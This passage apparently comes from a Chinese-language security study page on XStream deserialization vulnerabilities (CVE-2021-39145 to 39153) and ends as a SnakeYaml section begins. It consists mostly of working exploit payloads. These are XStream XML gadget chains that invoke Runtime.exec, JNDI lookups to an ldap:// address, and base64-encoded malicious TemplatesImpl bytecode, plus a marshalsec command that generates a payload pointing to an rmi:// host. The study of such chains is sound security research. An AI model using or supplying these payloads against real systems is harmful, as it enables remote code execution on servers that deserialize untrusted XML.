+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">triggerProbe</span><span class="hljs-params">(Method var1, Object[] var2)</span> </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.active) {
+            ProbeSkeleton var3 = (ProbeSkeleton)<span class="hljs-keyword">this</span>.probes.get(var1);
+            <span class="hljs-keyword">if</span> (var3 != <span class="hljs-keyword">null</span>) {
+                var3.uncheckedTrigger(var2);
+            }
+        }
+</code></pre>
+<p>sun.tracing.dtrace.DTraceProbe#uncheckedTrigger</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uncheckedTrigger</span><span class="hljs-params">(Object[] var1)</span> </span>{
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">this</span>.implementing_method.invoke(<span class="hljs-keyword">this</span>.proxy, var1);
+        } <span class="hljs-keyword">catch</span> (IllegalAccessException var3) {
+            <span class="hljs-keyword">assert</span> <span class="hljs-keyword">false</span>;
+        } <span class="hljs-keyword">catch</span> (InvocationTargetException var4) {
+            <span class="hljs-keyword">assert</span> <span class="hljs-keyword">false</span>;
+        }
+
+    }
+</code></pre>
+<p>&#x6700;&#x540E;&#x5C31;&#x662F;invoke&#x7684;&#x8C03;&#x7528;</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;dynamic-proxy&gt;
+      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+      &lt;handler class=&apos;sun.tracing.NullProvider&apos;&gt;
+        &lt;active&gt;true&lt;/active&gt;
+        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;
+        &lt;probes&gt;
+          &lt;entry&gt;
+            &lt;method&gt;
+              &lt;class&gt;java.lang.Comparable&lt;/class&gt;
+              &lt;name&gt;compareTo&lt;/name&gt;
+              &lt;parameter-types&gt;
+                &lt;class&gt;java.lang.Object&lt;/class&gt;
+              &lt;/parameter-types&gt;
+            &lt;/method&gt;
+            &lt;sun.tracing.dtrace.DTraceProbe&gt;
+              &lt;proxy class=&apos;java.lang.Runtime&apos;/&gt;
+              &lt;implementing__method&gt;
+                &lt;class&gt;java.lang.Runtime&lt;/class&gt;
+                &lt;name&gt;exec&lt;/name&gt;
+                &lt;parameter-types&gt;
+                  &lt;class&gt;java.lang.String&lt;/class&gt;
+                &lt;/parameter-types&gt;
+              &lt;/implementing__method&gt;
+            &lt;/sun.tracing.dtrace.DTraceProbe&gt;
+          &lt;/entry&gt;
+        &lt;/probes&gt;
+      &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+    &lt;string&gt;calc.exe&lt;/string&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><p>JNDI&#x6CE8;&#x5165;</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;dynamic-proxy&gt;
+      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+      &lt;handler class=&apos;sun.tracing.NullProvider&apos;&gt;
+        &lt;active&gt;true&lt;/active&gt;
+        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;
+        &lt;probes&gt;
+          &lt;entry&gt;
+            &lt;method&gt;
+              &lt;class&gt;java.lang.Comparable&lt;/class&gt;
+              &lt;name&gt;compareTo&lt;/name&gt;
+              &lt;parameter-types&gt;
+                &lt;class&gt;java.lang.Object&lt;/class&gt;
+              &lt;/parameter-types&gt;
+            &lt;/method&gt;
+            &lt;sun.tracing.dtrace.DTraceProbe&gt;
+              &lt;proxy class=&quot;javax.naming.InitialContext&quot;/&gt;
+              &lt;implementing__method&gt;
+                &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;
+                &lt;name&gt;doLookup&lt;/name&gt;
+                &lt;parameter-types&gt;
+                  &lt;class&gt;java.lang.String&lt;/class&gt;
+                &lt;/parameter-types&gt;
+              &lt;/implementing__method&gt;
+            &lt;/sun.tracing.dtrace.DTraceProbe&gt;
+          &lt;/entry&gt;
+        &lt;/probes&gt;
+      &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+    &lt;string&gt;ldap://127.0.0.1:1099/calc&lt;/string&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><h3 id="cve-2021-39145">CVE-2021-39145</h3>
+<p>JNDI&#x6CE8;&#x5165;, POC&#x53C2;&#x8003;:</p>
+<ul>
+<li><a href="https://x-stream.github.io/CVE-2021-39145.html" target="_blank">https://x-stream.github.io/CVE-2021-39145.html</a></li>
+<li><a href="https://github.com/R17a-17/JavaVulnSummary/blob/bd30150e9ea4ffd44a4be47cd63aedaa93f7ba22/xstream/src/main/java/com/r17a/xstream/cve/priorityqueue/CVE_2021_39145.java" target="_blank">https://github.com/R17a-17/JavaVulnSummary/blob/bd30150e9ea4ffd44a4be47cd63aedaa93f7ba22/xstream/src/main/java/com/r17a/xstream/cve/priorityqueue/CVE_2021_39145.java</a></li>
+</ul>
+<h3 id="cve-2021-39146">CVE-2021-39146</h3>
+<p>&#x601D;&#x8DEF;&#x540C;CVE-2021-21346, &#x627E;&#x5230;&#x4E86;SwingLazyValue&#x7684;&#x4EE3;&#x66FF;&#x54C1;UIDefaults$ProxyLazyValue#createValue:1105, &#x8FD9;&#x91CC;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x53CD;&#x5C04;&#x7684;&#x8C03;&#x7528;</p>
+<pre><code>if (methodName != null) {
+   Class[] types = getClassArray(args);
+   Method m = c.getMethod(methodName, types);
+   return MethodUtil.invoke(m, c, args);
+}
+</code></pre><p>POC</p>
+<pre><code>&lt;sorted-set&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;test&lt;/type&gt;
+    &lt;value class=&apos;javax.swing.MultiUIDefaults&apos; serialization=&apos;custom&apos;&gt;
+      &lt;unserializable-parents/&gt;
+      &lt;hashtable&gt;
+          &lt;default&gt;
+            &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;
+            &lt;threshold&gt;525&lt;/threshold&gt;
+          &lt;/default&gt;
+          &lt;int&gt;700&lt;/int&gt;
+          &lt;int&gt;0&lt;/int&gt;
+      &lt;/hashtable&gt;
+      &lt;javax.swing.UIDefaults&gt;
+          &lt;default&gt;
+            &lt;defaultLocale&gt;zh_CN&lt;/defaultLocale&gt;
+            &lt;resourceCache/&gt;
+          &lt;/default&gt;
+      &lt;/javax.swing.UIDefaults&gt;
+      &lt;javax.swing.MultiUIDefaults&gt;
+          &lt;default&gt;
+            &lt;tables&gt;
+            &lt;javax.swing.UIDefaults serialization=&apos;custom&apos;&gt;
+              &lt;unserializable-parents/&gt;
+              &lt;hashtable&gt;
+                &lt;default&gt;
+                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;
+                  &lt;threshold&gt;525&lt;/threshold&gt;
+                &lt;/default&gt;
+                &lt;int&gt;700&lt;/int&gt;
+                &lt;int&gt;1&lt;/int&gt;
+                &lt;string&gt;lazyValue&lt;/string&gt;
+                &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;
+                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;
+                  &lt;methodName&gt;doLookup&lt;/methodName&gt;
+                  &lt;args&gt;
+                    &lt;string&gt;ldap://127.0.0.1:1099/calc&lt;/string&gt;
+                  &lt;/args&gt;
+                &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;
+              &lt;/hashtable&gt;
+              &lt;javax.swing.UIDefaults&gt;
+                &lt;default&gt;
+                  &lt;defaultLocale reference=&apos;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&apos;/&gt;
+                  &lt;resourceCache/&gt;
+                &lt;/default&gt;
+              &lt;/javax.swing.UIDefaults&gt;
+            &lt;/javax.swing.UIDefaults&gt;
+            &lt;/tables&gt;
+          &lt;/default&gt;
+      &lt;/javax.swing.MultiUIDefaults&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;test&lt;/type&gt;
+    &lt;value class=&apos;com.sun.org.apache.xpath.internal.objects.XString&apos;&gt;
+      &lt;m__obj class=&apos;string&apos;&gt;test&lt;/m__obj&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+&lt;/sorted-set&gt;
+</code></pre><h3 id="cve-2021-39147cve-2021-39148">CVE-2021-39147/CVE-2021-39148</h3>
+<p>&#x53C2;&#x8003;:</p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/234537" target="_blank">https://www.anquanke.com/post/id/234537</a></li>
+<li><a href="https://www.anquanke.com/post/id/251814" target="_blank">https://www.anquanke.com/post/id/251814</a></li>
+</ul>
+<p>&#x7279;&#x5B9A;JDK&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#x5916;&#x90E8;&#x7684;&#x4EFB;&#x610F;&#x4EE3;&#x7801; </p>
+<h3 id="cve-2021-39149">CVE-2021-39149</h3>
+<p>&#x53C2;&#x8003;: <a href="https://xz.aliyun.com/t/10360" target="_blank">https://xz.aliyun.com/t/10360</a></p>
+<p>&#x901A;&#x8FC7;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x5728;HashMap&#x8C03;&#x7528;hash&#x7684;&#x65B9;&#x6CD5;&#x4E2D;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x8C03;&#x7528;hashCode</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>{
+        <span class="hljs-keyword">int</span> h;
+        <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);
+    }
+</code></pre>
+<p>&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x6307;&#x5411; com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl#invoke</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">( Object proxy, Method method, Object[] args )</span>
+        <span class="hljs-keyword">throws</span> Throwable
+    </span>{
+        <span class="hljs-comment">// Note that the declaring class in method is the interface</span>
+        <span class="hljs-comment">// in which the method was defined, not the proxy class.</span>
+        Class cls = method.getDeclaringClass() ;
+        InvocationHandler handler =
+            (InvocationHandler)classToInvocationHandler.get( cls ) ;
+
+        <span class="hljs-keyword">if</span> (handler == <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">if</span> (defaultHandler != <span class="hljs-keyword">null</span>)
+                handler = defaultHandler ;
+            <span class="hljs-keyword">else</span> {
+                ORBUtilSystemException wrapper = ORBUtilSystemException.get(
+                    CORBALogDomains.UTIL ) ;
+                <span class="hljs-keyword">throw</span> wrapper.noInvocationHandler( <span class="hljs-string">&quot;\&quot;&quot;</span> + method.toString() +
+                    <span class="hljs-string">&quot;\&quot;&quot;</span> ) ;
+            }
+        }
+
+        <span class="hljs-comment">// handler should never be null here.</span>
+
+        <span class="hljs-keyword">return</span> handler.invoke( proxy, method, args ) ;
+    }
+</code></pre>
+<p>&#x7EE7;&#x7EED;&#x63A7;&#x5236;<code>handler</code>&#x8D4B;&#x503C;&#x4E3A;NullProvider&#x7136;&#x540E;&#x8C03;&#x7528;ProviderSkeleton&#x4E2D;&#x7684;invoke&#x65B9;&#x6CD5;, &#x8FDB;&#x800C;&#x8DDF;&#x8FDB;&#x81F3;triggerProbe, &#x6B64;&#x65F6;&#x4F20;&#x5165;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;null, &#x540E;&#x7EED;&#x5C31;&#x662F; DTraceProbe &#x7684; uncheckedTrigger &#x65B9;&#x6CD5;&#x7684; invoke &#x8C03;&#x7528;</p>
+<pre><code>&lt;linked-hash-set&gt;
+    &lt;dynamic-proxy&gt;
+        &lt;interface&gt;map&lt;/interface&gt;
+        &lt;handler class=&apos;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&apos;&gt;
+            &lt;classToInvocationHandler class=&apos;linked-hash-map&apos;/&gt;
+            &lt;defaultHandler class=&apos;sun.tracing.NullProvider&apos;&gt;
+                &lt;active&gt;true&lt;/active&gt;
+                &lt;providerType&gt;java.lang.Object&lt;/providerType&gt;
+                &lt;probes&gt;
+                    &lt;entry&gt;
+                        &lt;method&gt;
+                            &lt;class&gt;java.lang.Object&lt;/class&gt;
+                            &lt;name&gt;hashCode&lt;/name&gt;
+                            &lt;parameter-types/&gt;
+                        &lt;/method&gt;
+                        &lt;sun.tracing.dtrace.DTraceProbe&gt;
+                            &lt;proxy class=&apos;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&apos; serialization=&apos;custom&apos;&gt;
+                                &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+                                    &lt;default&gt;
+                                        &lt;__name&gt;Evil&lt;/__name&gt;
+                                        &lt;__bytecodes&gt;
+                                            &lt;byte-array&gt;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==&lt;/byte-array&gt;
+                                        &lt;/__bytecodes&gt;
+                                        &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;
+                                        &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;
+                                    &lt;/default&gt;
+                                    &lt;boolean&gt;false&lt;/boolean&gt;
+                                &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+                            &lt;/proxy&gt;
+                            &lt;implementing__method&gt;
+                                &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;
+                                &lt;name&gt;getOutputProperties&lt;/name&gt;
+                                &lt;parameter-types/&gt;
+                            &lt;/implementing__method&gt;
+                        &lt;/sun.tracing.dtrace.DTraceProbe&gt;
+                    &lt;/entry&gt;
+                &lt;/probes&gt;
+            &lt;/defaultHandler&gt;
+        &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+&lt;/linked-hash-set&gt;
+</code></pre><h3 id="cve-2021-39153">CVE-2021-39153</h3>
+<pre><code>PriorityQueue.siftDownUsingComparator
+PackageWriter$2.compare
+BeanAdapter.get
+</code></pre><p>com.sun.javafx.fxml.BeanAdapter#get&#x89E6;&#x53D1;MethodUtil.invoke</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> Object <span class="hljs-title">get</span><span class="hljs-params">(String key)</span> </span>{
+        Method getterMethod = key.endsWith(PROPERTY_SUFFIX) ? localCache.getMethod(key) : getGetterMethod(key);
+
+        Object value;
+        <span class="hljs-keyword">if</span> (getterMethod != <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">try</span> {
+                value = MethodUtil.invoke(getterMethod, bean, (Object[]) <span class="hljs-keyword">null</span>);
+            } <span class="hljs-keyword">catch</span> (IllegalAccessException exception) {
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(exception);
+            } <span class="hljs-keyword">catch</span> (InvocationTargetException exception) {
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(exception);
+            }
+        } <span class="hljs-keyword">else</span> {
+            value = <span class="hljs-keyword">null</span>;
+        }
+
+        <span class="hljs-keyword">return</span> value;
+    }
+</code></pre>
+<p>POC</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+      &lt;comparator class=&apos;com.sun.java.util.jar.pack.PackageWriter$2&apos;&gt;
+        &lt;outer-class&gt;
+          &lt;verbose&gt;0&lt;/verbose&gt;
+          &lt;effort&gt;0&lt;/effort&gt;
+          &lt;optDumpBands&gt;false&lt;/optDumpBands&gt;
+          &lt;optDebugBands&gt;false&lt;/optDebugBands&gt;
+          &lt;optVaryCodings&gt;false&lt;/optVaryCodings&gt;
+          &lt;optBigStrings&gt;false&lt;/optBigStrings&gt;
+          &lt;isReader&gt;false&lt;/isReader&gt;
+          &lt;bandHeaderBytePos&gt;0&lt;/bandHeaderBytePos&gt;
+          &lt;bandHeaderBytePos0&gt;0&lt;/bandHeaderBytePos0&gt;
+          &lt;archiveOptions&gt;0&lt;/archiveOptions&gt;
+          &lt;archiveSize0&gt;0&lt;/archiveSize0&gt;
+          &lt;archiveSize1&gt;0&lt;/archiveSize1&gt;
+          &lt;archiveNextCount&gt;0&lt;/archiveNextCount&gt;
+          &lt;attrClassFileVersionMask&gt;0&lt;/attrClassFileVersionMask&gt;
+          &lt;attrIndexTable class=&apos;com.sun.javafx.fxml.BeanAdapter&apos;&gt;
+            &lt;bean class=&apos;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&apos; serialization=&apos;custom&apos;&gt;
+              &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+                &lt;default&gt;
+                  &lt;__name&gt;Pwnr&lt;/__name&gt;
+                  &lt;__bytecodes&gt;
+                    &lt;byte-array&gt;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==&lt;/byte-array&gt;
+                  &lt;/__bytecodes&gt;
+                  &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;
+                  &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;
+                &lt;/default&gt;
+              &lt;boolean&gt;false&lt;/boolean&gt;
+              &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+            &lt;/bean&gt;
+            &lt;localCache&gt;
+              &lt;methods&gt;
+                &lt;entry&gt;
+                  &lt;string&gt;getOutputProperties&lt;/string&gt;
+                  &lt;list&gt;
+                    &lt;method&gt;
+                      &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;
+                      &lt;name&gt;getOutputProperties&lt;/name&gt;
+                      &lt;parameter-types/&gt;
+                    &lt;/method&gt;
+                  &lt;/list&gt;
+                &lt;/entry&gt;
+              &lt;/methods&gt;
+            &lt;/localCache&gt;
+          &lt;/attrIndexTable&gt;
+          &lt;shortCodeHeader__h__limit&gt;0&lt;/shortCodeHeader__h__limit&gt;
+        &lt;/outer-class&gt;
+      &lt;/comparator&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;string-array&gt;
+      &lt;string&gt;ricky&lt;/string&gt;
+      &lt;string&gt;outputProperties&lt;/string&gt;
+    &lt;/string-array&gt;
+    &lt;string-array&gt;
+      &lt;string&gt;ricky&lt;/string&gt;
+    &lt;/string-array&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><h3 id="cve-reference">CVE Reference</h3>
+<p>&#x5168;&#x90E8;CVE&#x8BF7;&#x53C2;&#x8003;: <a href="https://x-stream.github.io/security.html" target="_blank">https://x-stream.github.io/security.html</a></p>
+<p>&#x6216;&#x8005;&#x4F7F;&#x7528;marshalsec&#x5DE5;&#x5177;&#x751F;&#x6210;payload</p>
+<pre><code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils rmi://127.0.0.1:2333/exp
+</code></pre><h2 id="sankeyaml">SankeYaml</h2>
+<p>&#x5927;&#x591A;&#x6570; java &#x9879;&#x76EE;&#x7528;&#x6765;&#x5904;&#x7406;&#x6570;&#x636E;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x662F; xml &#x548C; json &#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF0C;yaml &#x76F8;&#x5BF9;&#x6765;&#x8BF4;&#x5C11;&#x89C1;&#x4E00;&#x70B9;&#xFF0C;&#x5728;&#x6211;&#x505A;&#x8FC7;&#x7684;&#x4E00;&#x4E9B;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9879;&#x76EE;&#x91CC;&#xFF0C;&#x4F7F;&#x7528; yaml &#x5904;&#x7406;&#x5E93;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x5C31;&#x662F; SnakeYaml&#xFF0C;&#x867D;&#x7136;&#x8FD8;&#x6709; jyaml&#x3001;YAMLBeans &#x4E4B;&#x7C7B;&#x7684;&#x5E93;&#xFF0C;&#x4F46;&#x6211;&#x5728;&#x771F;&#x5B9E;&#x73AF;&#x5883;&#x91CC;&#x633A;&#x5C11;&#x6709;&#x89C1;&#x5230;&#x4F7F;&#x7528;&#x7684;&#x3002; </p>
+<p>&#x5148;&#x5BFC;&#x5165; snakeyaml &#x4F9D;&#x8D56; </p>
+<pre><code>&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.yaml&lt;/groupId&gt;
+    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
+    &lt;version&gt;1.17&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre><p>&#x7136;&#x540E;&#x8F93;&#x51FA;&#x5E8F;&#x5217;&#x5316;&#x4E00;&#x4E2A; javabean </p>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">snakeyaml</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
+        Yaml yaml = <span class="hljs-keyword">new</span> Yaml();
